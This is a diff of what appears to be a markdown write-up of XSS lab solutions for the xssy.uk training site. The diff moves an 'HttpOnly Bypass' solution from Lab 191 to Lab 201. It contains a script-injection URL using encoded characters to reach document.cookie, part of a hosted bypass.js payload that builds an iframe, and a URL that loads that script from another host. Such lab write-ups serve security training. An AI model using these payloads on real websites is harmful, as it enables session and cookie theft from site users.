@@ -819,6 +819,11 @@ https://7fj3bijv.xssy.uk/target.ftl?name=%C0%BCscript%C0%BEalert(document.cookie
 
 ### Lab 191: Split Payload
 - **URL Lab**: https://xssy.uk/lab/191
+- **Status**: Not solved yet
+
+
+### Lab 201: HttpOnly Bypass
+- **URL Lab**: https://xssy.uk/lab/201
 - **Host this Payload to bypass.js => our server**:
 ```
 var iframe = document.createElement("iframe");
@@ -834,10 +839,6 @@ document.body.appendChild(iframe);
 https://j7iocjip.xssy.uk/target.ftl?name=%3Cscript+src%3D%22https%3A%2F%2Feqh42jmm.xssy.uk%2Fbypass.js%22%3E%3C%2Fscript%3E
 ```
 ---
-
-### Lab 201: HttpOnly Bypass
-- **URL Lab**: https://xssy.uk/lab/201
-- **Status**: Not solved yet
 
 ---
 
